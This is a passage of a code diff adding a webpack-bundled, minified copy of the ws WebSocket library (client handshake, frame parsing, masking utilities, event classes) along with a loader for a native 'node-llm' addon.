+                    constructor(e, t, s) {
+                        super(), this._binaryType = y[0], this._closeCode = 1006, this._closeFrameReceived = !1, this._closeFrameSent = !1, this._closeMessage = b, this._closeTimer = null, this._errorEmitted = !1, this._extensions = {}, this._paused = !1, this._protocol = "", this._readyState = B.CONNECTING, this._receiver = null, this._sender = null, this._socket = null, null !== e ? (this._bufferedAmount = 0, this._isServer = !1, this._redirects = 0, void 0 === t ? t = [] : Array.isArray(t) || ("object" == typeof t && null !== t ? (s = t, t = []) : t = [t]), U(this, e, t, s)) : (this._autoPong = s.autoPong, this._isServer = !0)
+                    }
+                    get binaryType() {
+                        return this._binaryType
+                    }
+                    set binaryType(e) {
+                        y.includes(e) && (this._binaryType = e, this._receiver && (this._receiver._binaryType = e))
+                    }
+                    get bufferedAmount() {
+                        return this._socket ? this._socket._writableState.length + this._sender._bufferedBytes : this._bufferedAmount
+                    }
+                    get extensions() {
+                        return Object.keys(this._extensions).join()
+                    }
+                    get isPaused() {
+                        return this._paused
+                    }
+                    get onclose() {
+                        return null
+                    }
+                    get onerror() {
+                        return null
+                    }
+                    get onopen() {
+                        return null
+                    }
+                    get onmessage() {
+                        return null
+                    }
+                    get protocol() {
+                        return this._protocol
+                    }
+                    get readyState() {
+                        return this._readyState
+                    }
+                    get url() {
+                        return this._url
+                    }
+                    setSocket(e, t, s) {
+                        const r = new _({
+                                allowSynchronousEvents: s.allowSynchronousEvents,
+                                binaryType: this.binaryType,
+                                extensions: this._extensions,
+                                isServer: this._isServer,
+                                maxPayload: s.maxPayload,
+                                skipUTF8Validation: s.skipUTF8Validation
+                            }),
+                            i = new p(e, this._extensions, s.generateMask);
+                        this._receiver = r, this._sender = i, this._socket = e, r[E] = this, i[E] = this, e[E] = this, r.on("conclude", F), r.on("drain", $), r.on("error", G), r.on("message", q), r.on("ping", z), r.on("pong", H), i.onerror = Y, e.setTimeout && e.setTimeout(0), e.setNoDelay && e.setNoDelay(), t.length > 0 && e.unshift(t), e.on("close", Z), e.on("data", J), e.on("end", Q), e.on("error", ee), this._readyState = B.OPEN, this.emit("open")
+                    }
+                    emitClose() {
+                        if (!this._socket) return this._readyState = B.CLOSED, void this.emit("close", this._closeCode, this._closeMessage);
+                        this._extensions[f.extensionName] && this._extensions[f.extensionName].cleanup(), this._receiver.removeAllListeners(), this._readyState = B.CLOSED, this.emit("close", this._closeCode, this._closeMessage)
+                    }
+                    close(e, t) {
+                        if (this.readyState !== B.CLOSED) {
+                            if (this.readyState === B.CONNECTING) {
+                                const e = "WebSocket was closed before the connection was established";
+                                return void W(this, this._req, e)
+                            }
+                            this.readyState !== B.CLOSING ? (this._readyState = B.CLOSING, this._sender.close(e, t, !this._isServer, e => {
+                                e || (this._closeFrameSent = !0, (this._closeFrameReceived || this._receiver._writableState.errorEmitted) && this._socket.end())
+                            }), X(this)) : this._closeFrameSent && (this._closeFrameReceived || this._receiver._writableState.errorEmitted) && this._socket.end()
+                        }
+                    }
+                    pause() {
+                        this.readyState !== B.CONNECTING && this.readyState !== B.CLOSED && (this._paused = !0, this._socket.pause())
+                    }
+                    ping(e, t, s) {
+                        if (this.readyState === B.CONNECTING) throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");
+                        "function" == typeof e ? (s = e, e = t = void 0) : "function" == typeof t && (s = t, t = void 0), "number" == typeof e && (e = e.toString()), this.readyState === B.OPEN ? (void 0 === t && (t = !this._isServer), this._sender.ping(e || b, t, s)) : j(this, e, s)
+                    }
+                    pong(e, t, s) {
+                        if (this.readyState === B.CONNECTING) throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");
+                        "function" == typeof e ? (s = e, e = t = void 0) : "function" == typeof t && (s = t, t = void 0), "number" == typeof e && (e = e.toString()), this.readyState === B.OPEN ? (void 0 === t && (t = !this._isServer), this._sender.pong(e || b, t, s)) : j(this, e, s)
+                    }
+                    resume() {
+                        this.readyState !== B.CONNECTING && this.readyState !== B.CLOSED && (this._paused = !1, this._receiver._writableState.needDrain || this._socket.resume())
+                    }
+                    send(e, t, s) {
+                        if (this.readyState === B.CONNECTING) throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");
+                        if ("function" == typeof t && (s = t, t = {}), "number" == typeof e && (e = e.toString()), this.readyState !== B.OPEN) return void j(this, e, s);
+                        const r = {
+                            binary: "string" != typeof e,
+                            mask: !this._isServer,
+                            compress: !0,
+                            fin: !0,
+                            ...t
+                        };
+                        this._extensions[f.extensionName] || (r.compress = !1), this._sender.send(e || b, r, s)
+                    }
+                    terminate() {
+                        if (this.readyState !== B.CLOSED) {
+                            if (this.readyState === B.CONNECTING) {
+                                const e = "WebSocket was closed before the connection was established";
+                                return void W(this, this._req, e)
+                            }
+                            this._socket && (this._readyState = B.CLOSING, this._socket.destroy())
+                        }
+                    }
+                }
+
+                function U(e, t, s, r) {
+                    const n = {
+                        allowSynchronousEvents: !0,
+                        autoPong: !0,
+                        protocolVersion: R[1],
+                        maxPayload: 104857600,
+                        skipUTF8Validation: !1,
+                        perMessageDeflate: !0,
+                        followRedirects: !1,
+                        maxRedirects: 10,
+                        ...r,
+                        socketPath: void 0,
+                        hostname: void 0,
+                        protocol: void 0,
+                        timeout: void 0,
+                        method: "GET",
+                        host: void 0,
+                        path: void 0,
+                        port: void 0
+                    };
+                    if (e._autoPong = n.autoPong, !R.includes(n.protocolVersion)) throw new RangeError(`Unsupported protocol version: ${n.protocolVersion} (supported versions: ${R.join(", ")})`);
+                    let a;
+                    if (t instanceof u) a = t;
+                    else try {
+                        a = new u(t)
+                    } catch (e) {
+                        throw new SyntaxError(`Invalid URL: ${t}`)
+                    }
+                    "http:" === a.protocol ? a.protocol = "ws:" : "https:" === a.protocol && (a.protocol = "wss:"), e._url = a.href;
+                    const l = "wss:" === a.protocol,
+                        d = "ws+unix:" === a.protocol;
+                    let _;
+                    if ("ws:" === a.protocol || l || d ? d && !a.pathname ? _ = "The URL's pathname is empty" : a.hash && (_ = "The URL contains a fragment identifier") : _ = 'The URL\'s protocol must be one of "ws:", "wss:", "http:", "https:", or "ws+unix:"', _) {
+                        const t = new SyntaxError(_);
+                        if (0 === e._redirects) throw t;
+                        return void D(e, t)
+                    }
+                    const p = l ? 443 : 80,
+                        m = c(16).toString("base64"),
+                        y = l ? i.request : o.request,
+                        b = new Set;
+                    let g, S;
+                    if (n.createConnection = n.createConnection || (l ? A : M), n.defaultPort = n.defaultPort || p, n.port = a.port || p, n.host = a.hostname.startsWith("[") ? a.hostname.slice(1, -1) : a.hostname, n.headers = {
+                            ...n.headers,
+                            "Sec-WebSocket-Version": n.protocolVersion,
+                            "Sec-WebSocket-Key": m,
+                            Connection: "Upgrade",
+                            Upgrade: "websocket"
+                        }, n.path = a.pathname + a.search, n.timeout = n.handshakeTimeout, n.perMessageDeflate && (g = new f(!0 !== n.perMessageDeflate ? n.perMessageDeflate : {}, !1, n.maxPayload), n.headers["Sec-WebSocket-Extensions"] = O({
+                            [f.extensionName]: g.offer()
+                        })), s.length) {
+                        for (const e of s) {
+                            if ("string" != typeof e || !I.test(e) || b.has(e)) throw new SyntaxError("An invalid or duplicated subprotocol was specified");
+                            b.add(e)
+                        }
+                        n.headers["Sec-WebSocket-Protocol"] = s.join(",")
+                    }
+                    if (n.origin && (n.protocolVersion < 13 ? n.headers["Sec-WebSocket-Origin"] = n.origin : n.headers.Origin = n.origin), (a.username || a.password) && (n.auth = `${a.username}:${a.password}`), d) {
+                        const e = n.path.split(":");
+                        n.socketPath = e[0], n.path = e[1]
+                    }
+                    if (n.followRedirects) {
+                        if (0 === e._redirects) {
+                            e._originalIpc = d, e._originalSecure = l, e._originalHostOrSocketPath = d ? n.socketPath : a.host;
+                            const t = r && r.headers;
+                            if (r = {
+                                    ...r,
+                                    headers: {}
+                                }, t)
+                                for (const [e, s] of Object.entries(t)) r.headers[e.toLowerCase()] = s
+                        } else if (0 === e.listenerCount("redirect")) {
+                            const t = d ? !!e._originalIpc && n.socketPath === e._originalHostOrSocketPath : !e._originalIpc && a.host === e._originalHostOrSocketPath;
+                            (!t || e._originalSecure && !l) && (delete n.headers.authorization, delete n.headers.cookie, t || delete n.headers.host, n.auth = void 0)
+                        }
+                        n.auth && !r.headers.authorization && (r.headers.authorization = "Basic " + Buffer.from(n.auth).toString("base64")), S = e._req = y(n), e._redirects && e.emit("redirect", e.url, S)
+                    } else S = e._req = y(n);
+                    n.timeout && S.on("timeout", () => {
+                        W(e, S, "Opening handshake has timed out")
+                    }), S.on("error", t => {
+                        null === S || S[L] || (S = e._req = null, D(e, t))
+                    }), S.on("response", i => {
+                        const o = i.headers.location,
+                            a = i.statusCode;
+                        if (o && n.followRedirects && a >= 300 && a < 400) {
+                            if (++e._redirects > n.maxRedirects) return void W(e, S, "Maximum redirects exceeded");
+                            let i;
+                            S.abort();
+                            try {
+                                i = new u(o, t)
+                            } catch (t) {
+                                const s = new SyntaxError(`Invalid URL: ${o}`);
+                                return void D(e, s)
+                            }
+                            U(e, i, s, r)
+                        } else e.emit("unexpected-response", S, i) || W(e, S, `Unexpected server response: ${i.statusCode}`)
+                    }), S.on("upgrade", (t, s, r) => {
+                        if (e.emit("upgrade", t), e.readyState !== B.CONNECTING) return;
+                        S = e._req = null;
+                        const i = t.headers.upgrade;
+                        if (void 0 === i || "websocket" !== i.toLowerCase()) return void W(e, s, "Invalid Upgrade header");
+                        const o = h("sha1").update(m + v).digest("base64");
+                        if (t.headers["sec-websocket-accept"] !== o) return void W(e, s, "Invalid Sec-WebSocket-Accept header");
+                        const a = t.headers["sec-websocket-protocol"];
+                        let c;
+                        if (void 0 !== a ? b.size ? b.has(a) || (c = "Server sent an invalid subprotocol") : c = "Server sent a subprotocol but none was requested" : b.size && (c = "Server sent no subprotocol"), c) return void W(e, s, c);
+                        a && (e._protocol = a);
+                        const l = t.headers["sec-websocket-extensions"];
+                        if (void 0 !== l) {
+                            if (!g) return void W(e, s, "Server sent a Sec-WebSocket-Extensions header but no extension was requested");
+                            let t;
+                            try {
+                                t = C(l)
+                            } catch (t) {
+                                return void W(e, s, "Invalid Sec-WebSocket-Extensions header")
+                            }
+                            const r = Object.keys(t);
+                            if (1 !== r.length || r[0] !== f.extensionName) return void W(e, s, "Server indicated an extension that was not requested");
+                            try {
+                                g.accept(t[f.extensionName])
+                            } catch (t) {
+                                return void W(e, s, "Invalid Sec-WebSocket-Extensions header")
+                            }
+                            e._extensions[f.extensionName] = g
+                        }
+                        e.setSocket(s, r, {
+                            allowSynchronousEvents: n.allowSynchronousEvents,
+                            generateMask: n.generateMask,
+                            maxPayload: n.maxPayload,
+                            skipUTF8Validation: n.skipUTF8Validation
+                        })
+                    }), n.finishRequest ? n.finishRequest(S, e) : S.end()
+                }
+
+                function D(e, t) {
+                    e._readyState = B.CLOSING, e._errorEmitted = !0, e.emit("error", t), e.emitClose()
+                }
+
+                function M(e) {
+                    return e.path = e.socketPath, n.connect(e)
+                }
+
+                function A(e) {
+                    return e.path = void 0, e.servername || "" === e.servername || (e.servername = n.isIP(e.host) ? "" : e.host), a.connect(e)
+                }
+
+                function W(e, t, s) {
+                    e._readyState = B.CLOSING;
+                    const r = new Error(s);
+                    Error.captureStackTrace(r, W), t.setHeader ? (t[L] = !0, t.abort(), t.socket && !t.socket.destroyed && t.socket.destroy(), process.nextTick(D, e, r)) : (t.destroy(r), t.once("error", e.emit.bind(e, "error")), t.once("close", e.emitClose.bind(e)))
+                }
+
+                function j(e, t, s) {
+                    if (t) {
+                        const s = m(t) ? t.size : N(t).length;
+                        e._socket ? e._sender._bufferedBytes += s : e._bufferedAmount += s
+                    }
+                    if (s) {
+                        const t = new Error(`WebSocket is not open: readyState ${e.readyState} (${P[e.readyState]})`);
+                        process.nextTick(s, t)
+                    }
+                }
+
+                function F(e, t) {
+                    const s = this[E];
+                    s._closeFrameReceived = !0, s._closeMessage = t, s._closeCode = e, void 0 !== s._socket[E] && (s._socket.removeListener("data", J), process.nextTick(K, s._socket), 1005 === e ? s.close() : s.close(e, t))
+                }
+
+                function $() {
+                    const e = this[E];
+                    e.isPaused || e._socket.resume()
+                }
+
+                function G(e) {
+                    const t = this[E];
+                    void 0 !== t._socket[E] && (t._socket.removeListener("data", J), process.nextTick(K, t._socket), t.close(e[w])), t._errorEmitted || (t._errorEmitted = !0, t.emit("error", e))
+                }
+
+                function V() {
+                    this[E].emitClose()
+                }
+
+                function q(e, t) {
+                    this[E].emit("message", e, t)
+                }
+
+                function z(e) {
+                    const t = this[E];
+                    t._autoPong && t.pong(e, !this._isServer, k), t.emit("ping", e)
+                }
+
+                function H(e) {
+                    this[E].emit("pong", e)
+                }
+
+                function K(e) {
+                    e.resume()
+                }
+
+                function Y(e) {
+                    const t = this[E];
+                    t.readyState !== B.CLOSED && (t.readyState === B.OPEN && (t._readyState = B.CLOSING, X(t)), this._socket.end(), t._errorEmitted || (t._errorEmitted = !0, t.emit("error", e)))
+                }
+
+                function X(e) {
+                    e._closeTimer = setTimeout(e._socket.destroy.bind(e._socket), 3e4)
+                }
+
+                function Z() {
+                    const e = this[E];
+                    let t;
+                    this.removeListener("close", Z), this.removeListener("data", J), this.removeListener("end", Q), e._readyState = B.CLOSING, this._readableState.endEmitted || e._closeFrameReceived || e._receiver._writableState.errorEmitted || null === (t = e._socket.read()) || e._receiver.write(t), e._receiver.end(), this[E] = void 0, clearTimeout(e._closeTimer), e._receiver._writableState.finished || e._receiver._writableState.errorEmitted ? e.emitClose() : (e._receiver.on("error", V), e._receiver.on("finish", V))
+                }
+
+                function J(e) {
+                    this[E]._receiver.write(e) || this.pause()
+                }
+
+                function Q() {
+                    const e = this[E];
+                    e._readyState = B.CLOSING, e._receiver.end(), this.end()
+                }
+
+                function ee() {
+                    const e = this[E];
+                    this.removeListener("error", ee), this.on("error", k), e && (e._readyState = B.CLOSING, this.destroy())
+                }
+                Object.defineProperty(B, "CONNECTING", {
+                    enumerable: !0,
+                    value: P.indexOf("CONNECTING")
+                }), Object.defineProperty(B.prototype, "CONNECTING", {
+                    enumerable: !0,
+                    value: P.indexOf("CONNECTING")
+                }), Object.defineProperty(B, "OPEN", {
+                    enumerable: !0,
+                    value: P.indexOf("OPEN")
+                }), Object.defineProperty(B.prototype, "OPEN", {
+                    enumerable: !0,
+                    value: P.indexOf("OPEN")
+                }), Object.defineProperty(B, "CLOSING", {
+                    enumerable: !0,
+                    value: P.indexOf("CLOSING")
+                }), Object.defineProperty(B.prototype, "CLOSING", {
+                    enumerable: !0,
+                    value: P.indexOf("CLOSING")
+                }), Object.defineProperty(B, "CLOSED", {
+                    enumerable: !0,
+                    value: P.indexOf("CLOSED")
+                }), Object.defineProperty(B.prototype, "CLOSED", {
+                    enumerable: !0,
+                    value: P.indexOf("CLOSED")
+                }), ["binaryType", "bufferedAmount", "extensions", "isPaused", "protocol", "readyState", "url"].forEach(e => {
+                    Object.defineProperty(B.prototype, e, {
+                        enumerable: !0
+                    })
+                }), ["open", "error", "close", "message"].forEach(e => {
+                    Object.defineProperty(B.prototype, `on${e}`, {
+                        enumerable: !0,
+                        get() {
+                            for (const t of this.listeners(e))
+                                if (t[g]) return t[S];
+                            return null
+                        },
+                        set(t) {
+                            for (const t of this.listeners(e))
+                                if (t[g]) {
+                                    this.removeListener(e, t);
+                                    break
+                                }
+                            "function" == typeof t && this.addEventListener(e, t, {
+                                [g]: !0
+                            })
+                        }
+                    })
+                }), B.prototype.addEventListener = x, B.prototype.removeEventListener = T, e.exports = B
+            },
+            106(e) {
+                "use strict";
+                e.exports = require("zlib")
+            },
+            181(e) {
+                "use strict";
+                e.exports = require("buffer")
+            },
+            203(e) {
+                "use strict";
+                e.exports = require("stream")
+            },
+            237(e, t, s) {
+                "use strict";
+                const {
+                    tokenChars: r
+                } = s(880);
+                e.exports = {
+                    parse: function(e) {
+                        const t = new Set;
+                        let s = -1,
+                            i = -1,
+                            o = 0;
+                        for (; o < e.length; o++) {
+                            const n = e.charCodeAt(o);
+                            if (-1 === i && 1 === r[n]) - 1 === s && (s = o);
+                            else if (0 === o || 32 !== n && 9 !== n) {
+                                if (44 !== n) throw new SyntaxError(`Unexpected character at index ${o}`);
+                                {
+                                    if (-1 === s) throw new SyntaxError(`Unexpected character at index ${o}`); - 1 === i && (i = o);
+                                    const r = e.slice(s, i);
+                                    if (t.has(r)) throw new SyntaxError(`The "${r}" subprotocol is duplicated`);
+                                    t.add(r), s = i = -1
+                                }
+                            } else - 1 === i && -1 !== s && (i = o)
+                        }
+                        if (-1 === s || -1 !== i) throw new SyntaxError("Unexpected end of input");
+                        const n = e.slice(s, o);
+                        if (t.has(n)) throw new SyntaxError(`The "${n}" subprotocol is duplicated`);
+                        return t.add(n), t
+                    }
+                }
+            },
+            278(e) {
+                "use strict";
+                e.exports = require("net")
+            },
+            286(e, t, s) {
+                "use strict";
+                const {
+                    Writable: r
+                } = s(203), i = s(971), {
+                    BINARY_TYPES: o,
+                    EMPTY_BUFFER: n,
+                    kStatusCode: a,
+                    kWebSocket: c
+                } = s(614), {
+                    concat: h,
+                    toArrayBuffer: l,
+                    unmask: d
+                } = s(338), {
+                    isValidStatusCode: u,
+                    isValidUTF8: f
+                } = s(880), _ = Buffer[Symbol.species];
+                e.exports = class extends r {
+                    constructor(e = {}) {
+                        super(), this._allowSynchronousEvents = void 0 === e.allowSynchronousEvents || e.allowSynchronousEvents, this._binaryType = e.binaryType || o[0], this._extensions = e.extensions || {}, this._isServer = !!e.isServer, this._maxPayload = 0 | e.maxPayload, this._skipUTF8Validation = !!e.skipUTF8Validation, this[c] = void 0, this._bufferedBytes = 0, this._buffers = [], this._compressed = !1, this._payloadLength = 0, this._mask = void 0, this._fragmented = 0, this._masked = !1, this._fin = !1, this._opcode = 0, this._totalPayloadLength = 0, this._messageLength = 0, this._fragments = [], this._errored = !1, this._loop = !1, this._state = 0
+                    }
+                    _write(e, t, s) {
+                        if (8 === this._opcode && 0 == this._state) return s();
+                        this._bufferedBytes += e.length, this._buffers.push(e), this.startLoop(s)
+                    }
+                    consume(e) {
+                        if (this._bufferedBytes -= e, e === this._buffers[0].length) return this._buffers.shift();
+                        if (e < this._buffers[0].length) {
+                            const t = this._buffers[0];
+                            return this._buffers[0] = new _(t.buffer, t.byteOffset + e, t.length - e), new _(t.buffer, t.byteOffset, e)
+                        }
+                        const t = Buffer.allocUnsafe(e);
+                        do {
+                            const s = this._buffers[0],
+                                r = t.length - e;
+                            e >= s.length ? t.set(this._buffers.shift(), r) : (t.set(new Uint8Array(s.buffer, s.byteOffset, e), r), this._buffers[0] = new _(s.buffer, s.byteOffset + e, s.length - e)), e -= s.length
+                        } while (e > 0);
+                        return t
+                    }
+                    startLoop(e) {
+                        this._loop = !0;
+                        do {
+                            switch (this._state) {
+                                case 0:
+                                    this.getInfo(e);
+                                    break;
+                                case 1:
+                                    this.getPayloadLength16(e);
+                                    break;
+                                case 2:
+                                    this.getPayloadLength64(e);
+                                    break;
+                                case 3:
+                                    this.getMask();
+                                    break;
+                                case 4:
+                                    this.getData(e);
+                                    break;
+                                case 5:
+                                case 6:
+                                    return void(this._loop = !1)
+                            }
+                        } while (this._loop);
+                        this._errored || e()
+                    }
+                    getInfo(e) {
+                        if (this._bufferedBytes < 2) return void(this._loop = !1);
+                        const t = this.consume(2);
+                        if (48 & t[0]) return void e(this.createError(RangeError, "RSV2 and RSV3 must be clear", !0, 1002, "WS_ERR_UNEXPECTED_RSV_2_3"));
+                        const s = !(64 & ~t[0]);
+                        if (!s || this._extensions[i.extensionName]) {
+                            if (this._fin = !(128 & ~t[0]), this._opcode = 15 & t[0], this._payloadLength = 127 & t[1], 0 === this._opcode) {
+                                if (s) return void e(this.createError(RangeError, "RSV1 must be clear", !0, 1002, "WS_ERR_UNEXPECTED_RSV_1"));
+                                if (!this._fragmented) return void e(this.createError(RangeError, "invalid opcode 0", !0, 1002, "WS_ERR_INVALID_OPCODE"));
+                                this._opcode = this._fragmented
+                            } else if (1 === this._opcode || 2 === this._opcode) {
+                                if (this._fragmented) return void e(this.createError(RangeError, `invalid opcode ${this._opcode}`, !0, 1002, "WS_ERR_INVALID_OPCODE"));
+                                this._compressed = s
+                            } else {
+                                if (!(this._opcode > 7 && this._opcode < 11)) return void e(this.createError(RangeError, `invalid opcode ${this._opcode}`, !0, 1002, "WS_ERR_INVALID_OPCODE"));
+                                if (!this._fin) return void e(this.createError(RangeError, "FIN must be set", !0, 1002, "WS_ERR_EXPECTED_FIN"));
+                                if (s) return void e(this.createError(RangeError, "RSV1 must be clear", !0, 1002, "WS_ERR_UNEXPECTED_RSV_1"));
+                                if (this._payloadLength > 125 || 8 === this._opcode && 1 === this._payloadLength) return void e(this.createError(RangeError, `invalid payload length ${this._payloadLength}`, !0, 1002, "WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH"))
+                            }
+                            if (this._fin || this._fragmented || (this._fragmented = this._opcode), this._masked = !(128 & ~t[1]), this._isServer) {
+                                if (!this._masked) return void e(this.createError(RangeError, "MASK must be set", !0, 1002, "WS_ERR_EXPECTED_MASK"))
+                            } else if (this._masked) return void e(this.createError(RangeError, "MASK must be clear", !0, 1002, "WS_ERR_UNEXPECTED_MASK"));
+                            126 === this._payloadLength ? this._state = 1 : 127 === this._payloadLength ? this._state = 2 : this.haveLength(e)
+                        } else e(this.createError(RangeError, "RSV1 must be clear", !0, 1002, "WS_ERR_UNEXPECTED_RSV_1"))
+                    }
+                    getPayloadLength16(e) {
+                        this._bufferedBytes < 2 ? this._loop = !1 : (this._payloadLength = this.consume(2).readUInt16BE(0), this.haveLength(e))
+                    }
+                    getPayloadLength64(e) {
+                        if (this._bufferedBytes < 8) return void(this._loop = !1);
+                        const t = this.consume(8),
+                            s = t.readUInt32BE(0);
+                        s > Math.pow(2, 21) - 1 ? e(this.createError(RangeError, "Unsupported WebSocket frame: payload length > 2^53 - 1", !1, 1009, "WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH")) : (this._payloadLength = s * Math.pow(2, 32) + t.readUInt32BE(4), this.haveLength(e))
+                    }
+                    haveLength(e) {
+                        this._payloadLength && this._opcode < 8 && (this._totalPayloadLength += this._payloadLength, this._totalPayloadLength > this._maxPayload && this._maxPayload > 0) ? e(this.createError(RangeError, "Max payload size exceeded", !1, 1009, "WS_ERR_UNSUPPORTED_MESSAGE_LENGTH")) : this._masked ? this._state = 3 : this._state = 4
+                    }
+                    getMask() {
+                        this._bufferedBytes < 4 ? this._loop = !1 : (this._mask = this.consume(4), this._state = 4)
+                    }
+                    getData(e) {
+                        let t = n;
+                        if (this._payloadLength) {
+                            if (this._bufferedBytes < this._payloadLength) return void(this._loop = !1);
+                            t = this.consume(this._payloadLength), this._masked && 0 !== (this._mask[0] | this._mask[1] | this._mask[2] | this._mask[3]) && d(t, this._mask)
+                        }
+                        if (this._opcode > 7) this.controlMessage(t, e);
+                        else {
+                            if (this._compressed) return this._state = 5, void this.decompress(t, e);
+                            t.length && (this._messageLength = this._totalPayloadLength, this._fragments.push(t)), this.dataMessage(e)
+                        }
+                    }
+                    decompress(e, t) {
+                        this._extensions[i.extensionName].decompress(e, this._fin, (e, s) => {
+                            if (e) return t(e);
+                            if (s.length) {
+                                if (this._messageLength += s.length, this._messageLength > this._maxPayload && this._maxPayload > 0) {
+                                    const e = this.createError(RangeError, "Max payload size exceeded", !1, 1009, "WS_ERR_UNSUPPORTED_MESSAGE_LENGTH");
+                                    return void t(e)
+                                }
+                                this._fragments.push(s)
+                            }
+                            this.dataMessage(t), 0 === this._state && this.startLoop(t)
+                        })
+                    }
+                    dataMessage(e) {
+                        if (!this._fin) return void(this._state = 0);
+                        const t = this._messageLength,
+                            s = this._fragments;
+                        if (this._totalPayloadLength = 0, this._messageLength = 0, this._fragmented = 0, this._fragments = [], 2 === this._opcode) {
+                            let r;
+                            r = "nodebuffer" === this._binaryType ? h(s, t) : "arraybuffer" === this._binaryType ? l(h(s, t)) : "blob" === this._binaryType ? new Blob(s) : s, this._allowSynchronousEvents ? (this.emit("message", r, !0), this._state = 0) : (this._state = 6, setImmediate(() => {
+                                this.emit("message", r, !0), this._state = 0, this.startLoop(e)
+                            }))
+                        } else {
+                            const r = h(s, t);
+                            if (!this._skipUTF8Validation && !f(r)) {
+                                const t = this.createError(Error, "invalid UTF-8 sequence", !0, 1007, "WS_ERR_INVALID_UTF8");
+                                return void e(t)
+                            }
+                            5 === this._state || this._allowSynchronousEvents ? (this.emit("message", r, !1), this._state = 0) : (this._state = 6, setImmediate(() => {
+                                this.emit("message", r, !1), this._state = 0, this.startLoop(e)
+                            }))
+                        }
+                    }
+                    controlMessage(e, t) {
+                        if (8 !== this._opcode) this._allowSynchronousEvents ? (this.emit(9 === this._opcode ? "ping" : "pong", e), this._state = 0) : (this._state = 6, setImmediate(() => {
+                            this.emit(9 === this._opcode ? "ping" : "pong", e), this._state = 0, this.startLoop(t)
+                        }));
+                        else {
+                            if (0 === e.length) this._loop = !1, this.emit("conclude", 1005, n), this.end();
+                            else {
+                                const s = e.readUInt16BE(0);
+                                if (!u(s)) {
+                                    const e = this.createError(RangeError, `invalid status code ${s}`, !0, 1002, "WS_ERR_INVALID_CLOSE_CODE");
+                                    return void t(e)
+                                }
+                                const r = new _(e.buffer, e.byteOffset + 2, e.length - 2);
+                                if (!this._skipUTF8Validation && !f(r)) {
+                                    const e = this.createError(Error, "invalid UTF-8 sequence", !0, 1007, "WS_ERR_INVALID_UTF8");
+                                    return void t(e)
+                                }
+                                this._loop = !1, this.emit("conclude", s, r), this.end()
+                            }
+                            this._state = 0
+                        }
+                    }
+                    createError(e, t, s, r, i) {
+                        this._loop = !1, this._errored = !0;
+                        const o = new e(s ? `Invalid WebSocket frame: ${t}` : t);
+                        return Error.captureStackTrace(o, this.createError), o.code = i, o[a] = r, o
+                    }
+                }
+            },
+            338(e, t, s) {
+                "use strict";
+                const {
+                    EMPTY_BUFFER: r
+                } = s(614), i = Buffer[Symbol.species];
+
+                function o(e, t, s, r, i) {
+                    for (let o = 0; o < i; o++) s[r + o] = e[o] ^ t[3 & o]
+                }
+
+                function n(e, t) {
+                    for (let s = 0; s < e.length; s++) e[s] ^= t[3 & s]
+                }
+                if (e.exports = {
+                        concat: function(e, t) {
+                            if (0 === e.length) return r;
+                            if (1 === e.length) return e[0];
+                            const s = Buffer.allocUnsafe(t);
+                            let o = 0;
+                            for (let t = 0; t < e.length; t++) {
+                                const r = e[t];
+                                s.set(r, o), o += r.length
+                            }
+                            return o < t ? new i(s.buffer, s.byteOffset, o) : s
+                        },
+                        mask: o,
+                        toArrayBuffer: function(e) {
+                            return e.length === e.buffer.byteLength ? e.buffer : e.buffer.slice(e.byteOffset, e.byteOffset + e.length)
+                        },
+                        toBuffer: function e(t) {
+                            if (e.readOnly = !0, Buffer.isBuffer(t)) return t;
+                            let s;
+                            return t instanceof ArrayBuffer ? s = new i(t) : ArrayBuffer.isView(t) ? s = new i(t.buffer, t.byteOffset, t.byteLength) : (s = Buffer.from(t), e.readOnly = !1), s
+                        },
+                        unmask: n
+                    }, !process.env.WS_NO_BUFFER_UTIL) try {
+                    const t = s(Object(function() {
+                        var e = new Error("Cannot find module 'bufferutil'");
+                        throw e.code = "MODULE_NOT_FOUND", e
+                    }()));
+                    e.exports.mask = function(e, s, r, i, n) {
+                        n < 48 ? o(e, s, r, i, n) : t.mask(e, s, r, i, n)
+                    }, e.exports.unmask = function(e, s) {
+                        e.length < 32 ? n(e, s) : t.unmask(e, s)
+                    }
+                } catch (e) {}
+            },
+            434(e) {
+                "use strict";
+                e.exports = require("events")
+            },
+            576(e, t, s) {
+                e = s.nmd(e);
+                try {
+                    process.dlopen(e, s(928).join(__dirname, s.p, "packages/llm/node-llm.node"))
+                } catch (e) {
+                    throw new Error("node-loader:\n" + e)
+                }
+            },
+            597(e, t, s) {
+                "use strict";
+                const {
+                    kForOnEventAttribute: r,
+                    kListener: i
+                } = s(614), o = Symbol("kCode"), n = Symbol("kData"), a = Symbol("kError"), c = Symbol("kMessage"), h = Symbol("kReason"), l = Symbol("kTarget"), d = Symbol("kType"), u = Symbol("kWasClean");
+                class f {
+                    constructor(e) {
+                        this[l] = null, this[d] = e
+                    }
+                    get target() {
+                        return this[l]
+                    }
+                    get type() {
+                        return this[d]
+                    }
+                }
+                Object.defineProperty(f.prototype, "target", {
+                    enumerable: !0
+                }), Object.defineProperty(f.prototype, "type", {
+                    enumerable: !0
+                });
+                class _ extends f {
+                    constructor(e, t = {}) {
+                        super(e), this[o] = void 0 === t.code ? 0 : t.code, this[h] = void 0 === t.reason ? "" : t.reason, this[u] = void 0 !== t.wasClean && t.wasClean
+                    }
+                    get code() {
+                        return this[o]
+                    }
+                    get reason() {
+                        return this[h]
+                    }
+                    get wasClean() {
+                        return this[u]
+                    }
+                }
+                Object.defineProperty(_.prototype, "code", {
+                    enumerable: !0
+                }), Object.defineProperty(_.prototype, "reason", {
+                    enumerable: !0
+                }), Object.defineProperty(_.prototype, "wasClean", {
+                    enumerable: !0
+                });
+                class p extends f {
+                    constructor(e, t = {}) {
+                        super(e), this[a] = void 0 === t.error ? null : t.error, this[c] = void 0 === t.message ? "" : t.message
+                    }
+                    get error() {
+                        return this[a]
+                    }
+                    get message() {
+                        return this[c]
+                    }
+                }
+                Object.defineProperty(p.prototype, "error", {
+                    enumerable: !0
+                }), Object.defineProperty(p.prototype, "message", {
+                    enumerable: !0
+                });
+                class m extends f {
+                    constructor(e, t = {}) {
+                        super(e), this[n] = void 0 === t.data ? null : t.data
+                    }
+                    get data() {
+                        return this[n]
+                    }
+                }
+                Object.defineProperty(m.prototype, "data", {
+                    enumerable: !0
+                });
+                const y = {
+                    addEventListener(e, t, s = {}) {
+                        for (const o of this.listeners(e))
